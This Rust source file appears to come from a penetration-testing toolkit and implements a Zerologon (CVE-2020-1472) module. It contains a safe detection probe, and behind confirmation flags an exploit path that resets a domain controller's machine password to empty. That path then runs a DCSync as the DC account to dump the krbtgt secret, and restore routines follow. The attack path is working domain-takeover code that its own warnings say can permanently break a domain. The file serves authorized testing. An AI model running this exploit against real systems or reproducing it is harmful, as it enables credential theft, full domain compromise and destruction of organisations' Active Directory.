//! Zerologon (CVE-2020-1472) — SAFE detection by default; `--exploit` gate
//! for the destructive machine-password-reset path.

use anyhow::Result;
use clap::Parser;

use crate::ui;

#[derive(Parser)]
pub(crate) struct ZerologonArgs {
    /// DC host or IP.
    #[arg(long)]
    pub host: String,
    /// DC NetBIOS computer name (the machine account without the `$`), e.g. DC01.
    #[arg(long)]
    pub netbios: String,
    /// Max handshake attempts (success is expected within ~256 on a vulnerable DC).
    #[arg(long, default_value_t = 2000)]
    pub attempts: u32,
    /// DESTRUCTIVE: after detection, reset the DC machine password to empty and DCSync as the DC
    /// account to prove Domain Admin. Prompts for confirmation unless --yes. Leaves the machine
    /// password empty — see the printed restore guidance.
    #[arg(long)]
    pub exploit: bool,
    /// Skip the exploit confirmation prompt (unattended).
    #[arg(long)]
    pub yes: bool,
    /// Required to arm --exploit. The reset can PERMANENTLY BREAK a single-DC domain: restore is
    /// only reliable with the original cleartext and is not guaranteed on a lone DC. Pass this only
    /// after reading that and confirming an authorized, recoverable (multi-DC or disposable) target.
    #[arg(long)]
    pub confirm_brick_risk: bool,
    /// NetBIOS domain (for the DCSync proof), e.g. CORP.
    #[arg(long, default_value = "")]
    pub domain: String,
    /// RESTORE the machine account to this NT hash (32 hex) — sets AD back to match the DC's local
    /// secret after an exploit. Run this after `--exploit` (machine password is empty) with the
    /// original DC$ hash (recorded pre-exploit, or recovered via secretsdump of $MACHINE.ACC).
    #[arg(long)]
    pub restore: Option<String>,
    /// FULL restore: set the machine account back to this CLEARTEXT (regenerates NT + AES keys, so
    /// the AES secure channel heals — unlike --restore which only sets the NT hash). Use the DC's
    /// current local machine password.
    #[arg(long)]
    pub restore_password: Option<String>,
}

/// Zerologon (CVE-2020-1472) SAFE detection: try the all-zero Netlogon handshake over MS-NRPC and
/// report whether the DC accepts it. Never calls NetrServerPasswordSet2 — the machine password is
/// left untouched. Exploitation (with password restore) is a separate, explicitly-confirmed step.
pub(crate) async fn zerologon(a: ZerologonArgs) -> Result<()> {
    use dcerpc::netlogon::{
        detect_zerologon, exploit_set_empty_password, restore_password, restore_password_cleartext,
        Zerologon,
    };

    // Full restore path: set the machine account back to a known CLEARTEXT (heals NT + AES).
    if let Some(pw) = &a.restore_password {
        let sp = ui::Spinner::start(format!(
            "{} — full restore of {}$ (cleartext)",
            a.host, a.netbios
        ));
        let ok = restore_password_cleartext(&a.host, &a.netbios, pw, a.attempts).await?;
        if ok {
            sp.done("restore accepted");
            ui::ok(&format!(
                "machine account {}$ fully restored (NT + AES) — reboot the DC to heal the secure channel.",
                a.netbios
            ));
        } else {
            sp.done("restore not accepted");
            ui::warn("NetrServerPasswordSet2 rejected (DC not vulnerable, or machine password not empty).");
        }
        return Ok(());
    }

    // Restore path: set the machine account back to a known NT hash over the zero channel.
    if let Some(hex) = &a.restore {
        let nt = crate::parse_nt_hash(hex)?;
        let sp = ui::Spinner::start(format!(
            "{} — restoring {}$ machine hash via Netlogon",
            a.host, a.netbios
        ));
        let ok = restore_password(&a.host, &a.netbios, &nt, a.attempts).await?;
        if ok {
            sp.done("restore accepted");
            ui::ok(&format!(
                "machine account {}$ set back to {hex} — reboot the DC so LSASS re-reads the (now-matching) secret.",
                a.netbios
            ));
        } else {
            sp.done("restore not accepted");
            ui::warn("NetrServerPasswordSet was rejected (DC no longer vulnerable, or machine password is not empty).");
        }
        return Ok(());
    }
    let sp = ui::Spinner::start(format!(
        "{} — Netlogon zero-auth probe (≤{} attempts)",
        a.host, a.attempts
    ));
    let vuln = match detect_zerologon(&a.host, &a.netbios, a.attempts).await? {
        Zerologon::Vulnerable { attempts } => {
            sp.done("probe complete");
            ui::bad(&format!(
                "VULNERABLE to Zerologon (CVE-2020-1472) — Netlogon accepted an unauthenticated \
                 all-zero secure channel after {attempts} attempt(s)"
            ));
            ui::field(
                "impact",
                "an unauthenticated attacker can set the DC machine account password to empty → \
                 DCSync the domain → Domain Admin.",
            );
            ui::field(
                "remediation",
                "apply the August 2020 patch + enforce KB4557222.",
            );
            true
        }
        Zerologon::NotVulnerable { attempts } => {
            sp.done("probe complete");
            ui::ok(&format!(
                "not vulnerable to Zerologon — all {attempts} attempts rejected (patched/enforced)"
            ));
            false
        }
    };

    if !a.exploit || !vuln {
        if vuln {
            ui::info("safe detection only — machine password untouched. Re-run with --exploit to prove impact.");
        }
        return Ok(());
    }

    // --- Exploitation (DESTRUCTIVE) — double-gated ---
    ui::bad("EXPLOIT resets the DC machine account password to EMPTY. This is DESTRUCTIVE.");
    ui::warn("It orphans the DC's secure channel and can PERMANENTLY BREAK a single-DC domain —");
    ui::warn("restore requires the ORIGINAL machine secret and is NOT guaranteed on a lone DC.");
    ui::warn(
        "Only run against an authorized, RECOVERABLE target (multi-DC domain, or disposable).",
    );
    if !a.confirm_brick_risk {
        ui::info(
            "refusing to exploit: re-run with --confirm-brick-risk once you accept the above.",
        );
        return Ok(());
    }
    if !a.yes {
        use std::io::Write;
        print!("Proceed with exploitation? [y/N]: ");
        std::io::stdout().flush().ok();
        let mut line = String::new();
        std::io::stdin().read_line(&mut line).ok();
        if !line.trim().eq_ignore_ascii_case("y") {
            ui::info("declined — machine password untouched.");
            return Ok(());
        }
    }

    let sp = ui::Spinner::start("resetting machine password to empty (Netlogon)");
    let ok = exploit_set_empty_password(&a.host, &a.netbios, a.attempts).await?;
    if !ok {
        sp.done("reset not accepted");
        ui::warn(
            "NetrServerPasswordSet2 was rejected — the DC may be patched between probe and reset.",
        );
        return Ok(());
    }
    sp.done("machine password reset to EMPTY");
    let empty_hash = "31d6cfe0d16ae931b73c59d7e0c089c0";
    ui::field(
        "account",
        &format!("{}$  NT hash now = {empty_hash} (empty)", a.netbios),
    );

    // Prove Domain Admin: DCSync the whole domain authenticating as the DC machine account.
    let domain = if a.domain.is_empty() {
        &a.netbios
    } else {
        &a.domain
    };
    ui::info("DCSync as the DC machine account (empty hash) — proving Domain Admin:");
    let exe = std::env::current_exe().map_err(|e| anyhow::anyhow!("current_exe: {e}"))?;
    // The machine password is now empty, so authenticate as DC$ with an empty password.
    let out = std::process::Command::new(&exe)
        .args([
            "attack",
            "dcsync",
            "--host",
            &a.host,
            "--domain",
            domain,
            "--user",
            &format!("{}$", a.netbios),
            "--password",
            "",
            "--target",
            "krbtgt",
        ])
        .output()
        .map_err(|e| anyhow::anyhow!("spawn dcsync: {e}"))?;
    let dump = String::from_utf8_lossy(&out.stdout);
    let mut dumped = false;
    for line in dump
        .lines()
        .filter(|l| l.contains(":::") || l.contains("aes256"))
    {
        println!("    {line}");
        dumped = true;
    }
    if dumped {
        ui::bad("Domain Admin proven — krbtgt secret replicated as the DC machine account (empty password).");
    } else {
        ui::warn("reset succeeded but DCSync-as-DC$ returned nothing (retry `attack dcsync --user <DC>$ --password \"\"`).");
    }

    ui::warn("machine password is left EMPTY — RESTORE it now to avoid orphaning the DC:");
    ui::field(
        "restore",
        &format!(
            "recover the ORIGINAL {}$ secret from the DC's LSA (secretsdump with a DCSync'd admin \
             hash → $MACHINE.ACC) and set it back via NetrServerPasswordSet over a legitimate \
             Netlogon channel. (Automated restore is the next build step.)",
            a.netbios
        ),
    );
    Ok(())
}
